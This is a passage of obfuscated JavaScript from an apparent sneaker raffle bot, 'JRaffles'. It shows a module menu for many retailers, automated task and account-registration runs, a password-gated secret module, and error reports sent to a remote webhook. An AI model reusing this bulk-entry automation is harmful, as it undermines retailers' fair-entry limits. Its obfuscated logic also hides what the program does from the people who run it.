                _0x59687e('JRaffles\x20' + _0x92063b), console['clear'](), console['log']('Hello\x20' + _0x2d77f8['cyan']('' + _0x447b4a) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x92063b), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x3963cb = 0x0; _0x3963cb < _0x509612['length'] - 0x4; _0x3963cb++) {
                    if (_0x3963cb >= 0xa) {
                        console['log']('\x20(' + _0x3963cb + ')\x20[' + _0x509612[_0x3963cb]['name'] + ']');
                        continue;
                    }
                    if (_0x509612[_0x3963cb]['name'] === 'Reload\x20Settings' || _0x509612[_0x3963cb]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x3963cb + ')\x20\x20[' + _0x509612[_0x3963cb]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x509612['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x509612['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x509612['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x509612['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2545d2();
                if (taskModule > _0x509612['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x572e60(0x3e8), _0x1e1ae6();
                if (_0x509612[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                    var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x564234 = await _0x399720();
                            await _0x3f2736['function'](_0x3f2736, _0x564234);
                        }
                        if (taskFunction == 0x2) {
                            var _0x564234 = await _0x399720(), _0x3b9ef1 = await _0x258b84(_0x3f2736);
                            _0x114346['shuffleTasks'] && await _0x3a3051(_0x3b9ef1), await _0x3f2736['function'](_0x3f2736, _0x3b9ef1, _0x564234);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x564234 = await _0x399720(), _0x3b9ef1 = await _0x258b84(_0x3f2736);
                                _0x114346['shuffleTasks'] && await _0x3a3051(_0x3b9ef1), await _0x3f2736['function'](_0x3f2736, _0x3b9ef1, _0x564234);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x564234 = await _0x399720();
                                    await _0x3f2736['function'](_0x3f2736, _0x564234);
                                }
                            }
                        }
                    } catch (_0x250996) {
                        console['log'](_0x250996), await _0x572e60(0x7d0);
                    }
                    return _0x1e1ae6();
                }
                if (_0x509612[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                        var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x564234 = await _0x399720(), _0x2107e6 = await _0x258b84(_0x3f2736);
                            _0x114346['shuffleTasks'] && await _0x3a3051(_0x2107e6), await _0x3f2736['function'](_0x3f2736, _0x2107e6, _0x564234);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x564234 = await _0x399720(), _0x2107e6 = await _0x258b84(_0x3f2736);
                                _0x114346['shuffleTasks'] && await _0x3a3051(_0x2107e6), await _0x3f2736['function'](_0x3f2736, _0x2107e6, _0x564234);
                            }
                        }
                    } catch (_0xec17fd) {
                        console['log'](_0xec17fd), await _0x572e60(0xfa0);
                    }
                    return _0x1e1ae6();
                }
                if (_0x509612[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                        var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x564234 = await _0x399720(), _0x2107e6 = await _0x258b84(_0x3f2736);
                            _0x114346['shuffleTasks'] && await _0x3a3051(_0x2107e6), await _0x3f2736['function'](_0x3f2736, _0x2107e6, _0x564234);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x564234 = await _0x399720(), _0x2107e6 = await _0x258b84(_0x3f2736);
                                _0x114346['shuffleTasks'] && await _0x3a3051(_0x2107e6), await _0x3f2736['function'](_0x3f2736, _0x2107e6, _0x564234);
                            }
                        }
                    } catch (_0x2b6af1) {
                        console['log'](_0x2b6af1), await _0x572e60(0xfa0);
                    }
                    return _0x1e1ae6();
                }
                if (_0x509612[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                    var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x564234 = await _0x399720();
                        return await _0x3f2736['function'](_0x3f2736, _0x564234), _0x1e1ae6();
                    }
                    var _0x564234 = await _0x399720(), _0x1bd80e = await _0x258b84(_0x3f2736);
                    return _0x114346['shuffleTasks'] && await _0x3a3051(_0x1bd80e), await _0x3f2736['function'](_0x3f2736, _0x1bd80e, _0x564234), _0x1e1ae6();
                }
                if (_0x509612[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                    var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x564234 = await _0x399720(), _0x1bd80e = await _0x258b84(_0x3f2736);
                    return _0x114346['shuffleTasks'] && await _0x3a3051(_0x1bd80e), await _0x3f2736['function'](_0x3f2736, _0x1bd80e, _0x564234), _0x1e1ae6();
                }
                if (_0x509612[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                    var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x564234 = await _0x399720(), _0x1bd80e = await _0x258b84(_0x3f2736);
                    return _0x114346['shuffleTasks'] && await _0x3a3051(_0x1bd80e), await _0x3f2736['function'](_0x3f2736, _0x1bd80e, _0x564234), _0x1e1ae6();
                }
                if (_0x509612[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                    var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x564234 = await _0x399720(), _0x1bd80e = await _0x258b84(_0x3f2736);
                    return _0x114346['shuffleTasks'] && await _0x3a3051(_0x1bd80e), await _0x3f2736['function'](_0x3f2736, _0x1bd80e, _0x564234), _0x1e1ae6();
                } else {
                    if (_0x509612[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                        var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x564234 = await _0x399720(), _0x18a509 = await _0x258b84(_0x3f2736);
                            return _0x114346['shuffleTasks'] && await _0x3a3051(_0x18a509), await _0x3f2736['function'](_0x3f2736, _0x18a509, _0x564234), _0x1e1ae6();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x564234 = await _0x399720();
                                return await _0x3f2736['function'](_0x3f2736, null, _0x564234), _0x1e1ae6();
                            }
                        }
                        ;
                    } else {
                        if (_0x509612[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                            var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction], _0x564234 = await _0x399720(), _0x23cb64 = await _0x258b84(_0x3f2736);
                            return _0x114346['shuffleTasks'] && await _0x3a3051(_0x23cb64), await _0x3f2736['function'](_0x3f2736, _0x23cb64, _0x564234), await _0x572e60(0x1388), _0x1e1ae6();
                        } else {
                            if (_0x509612[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                                var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x564234 = await _0x399720(), _0x18a509 = await _0x258b84(_0x3f2736);
                                    return _0x114346['shuffleTasks'] && await _0x3a3051(_0x18a509), await _0x3f2736['function'](_0x3f2736, _0x18a509, _0x564234), _0x1e1ae6();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x564234 = await _0x399720();
                                        return await _0x3f2736['function'](_0x3f2736, null, _0x564234), _0x1e1ae6();
                                    }
                                }
                                ;
                            } else {
                                if (_0x509612[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                                    var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x3f2736);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x509612[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                                        var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x564234 = await _0x399720(), _0x413457 = await _0x258b84(_0x3f2736);
                                            return _0x114346['shuffleTasks'] && await _0x3a3051(_0x413457), await _0x3f2736['function'](_0x3f2736, _0x413457, _0x564234), _0x1e1ae6();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x564234 = await _0x399720(), _0x413457 = await _0x258b84(_0x3f2736);
                                                return _0x114346['shuffleTasks'] && await _0x3a3051(_0x413457), await _0x3f2736['function'](_0x3f2736, _0x413457, _0x564234), _0x1e1ae6();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x509612[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                                            var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x564234 = await _0x399720(), _0x46ac63 = await _0x258b84(_0x3f2736);
                                                return _0x114346['shuffleTasks'] && await _0x3a3051(_0x46ac63), await _0x3f2736['function'](_0x3f2736, _0x46ac63, _0x564234), _0x1e1ae6();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x564234 = await _0x399720(), _0x46ac63 = await _0x258b84(_0x3f2736);
                                                    return _0x114346['shuffleTasks'] && await _0x3a3051(_0x46ac63), await _0x3f2736['function'](_0x3f2736, _0x46ac63, _0x564234), _0x1e1ae6();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x509612[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                                                var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x564234 = await _0x399720(), _0x36f4d3 = await _0x258b84(_0x3f2736);
                                                    return _0x114346['shuffleTasks'] && await _0x3a3051(_0x36f4d3), await _0x3f2736['function'](_0x3f2736, _0x36f4d3, _0x564234), _0x1e1ae6();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x564234 = await _0x399720(), _0x36f4d3 = await _0x258b84(_0x3f2736);
                                                        return _0x114346['shuffleTasks'] && await _0x3a3051(_0x36f4d3), await _0x3f2736['function'](_0x3f2736, _0x36f4d3, _0x564234), _0x1e1ae6();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x509612[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                                                    var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x564234 = await _0x399720(), _0x2e8fe6 = await _0x258b84(_0x3f2736);
                                                        return _0x114346['shuffleTasks'] && await _0x3a3051(_0x2e8fe6), await _0x3f2736['function'](_0x3f2736, _0x2e8fe6, _0x564234), _0x1e1ae6();
                                                    }
                                                } else {
                                                    if (_0x509612[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x572e60(0x3e8), _0x1e1ae6();
                                                    else {
                                                        if (_0x509612[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x54a776 = _0x509612[taskModule]['name'], _0x564234 = await _0x399720();
                                                            return await _0x39cb86(_0x54a776, _0x564234), _0x1e1ae6();
                                                        } else {
                                                            if (_0x509612[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x295f69(_0x509612[taskModule]['modules']);
                                                                var _0x3f2736 = _0x509612[taskModule]['modules'][taskFunction];
                                                                return await _0x3f2736['function'](_0x3f2736), _0x1e1ae6();
                                                            } else {
                                                                if (_0x509612[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x261260 = 0x0;
                                                                    for (const _0x25e818 in _0x114346) {
                                                                        console['log']('(' + _0x261260 + ')\x20' + _0x25e818 + '\x20:\x20' + _0x114346[_0x25e818]), _0x261260++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x261260 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x4b8ee9 = await _0x1b89f9();
                                                                    if (_0x4b8ee9 == _0x261260)
                                                                        return _0x1e1ae6();
                                                                    console['clear'];
                                                                    var _0x158ce7 = 0x0;
                                                                    for (var _0x3cac73 in _0x114346) {
                                                                        if (_0x4b8ee9 == _0x158ce7) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x3cac73 + '\x20:'), _0x114346[_0x3cac73] = await _0x13c866(), _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346));
                                                                            break;
                                                                        } else
                                                                            _0x158ce7++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x572e60(0xbb8), _0x1e1ae6();
                                                                } else {
                                                                    if (_0x509612[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x4e0b5b(), _0x1e1ae6();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x509612[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x528b52 = await _0x2ed0cd();
                                                                            _0x528b52 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x2184ef(), await afewFunction(_0x1225bf[_0x4180b8], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x572e60(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x1e1ae6();
            } catch (_0x1fdcc3) {
                return console['log'](_0x1fdcc3), _0x1e1ae6();
            }
        } catch (_0x2204c6) {
            return console['log'](_0x2204c6), await _0x572e60(0x3a98);
        }
}
;
_0x59687e('JRaffles\x20' + _0x92063b), _0x4e0b5b();
try {
    _0x1f780c();
} catch (_0x4dbf37) {
    var _0x3368f5 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x447b4a
            },
            {
                'name': 'Version',
                'value': '' + _0x92063b
            },
            {
                'name': 'Error',
                'value': '' + _0x4dbf37
            }
        ]
    }];
    const _0x4f1128 = { 'embeds': _0x3368f5 };
    _0x5641c6(_0x188004, _0x4f1128);
}